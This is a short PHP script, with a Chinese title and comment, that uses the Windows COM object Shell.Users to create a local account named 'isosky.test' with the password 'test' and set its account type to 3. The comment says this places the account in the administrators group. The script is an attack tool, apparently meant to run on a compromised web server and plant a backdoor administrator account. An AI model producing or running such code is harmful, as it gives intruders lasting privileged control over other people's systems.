<?php
echo "<div align=center><b>PHP 版Shell.Users加管理员帐号</b></div>";
$username="isosky.test";
$password="test";
$su = new COM("Shell.Users");
$h=$su->create($username);
$h->changePassword($password,"");
$h->setting["AccountType"] = 3;//这句很重要可以把用户加入administrators 组,
?>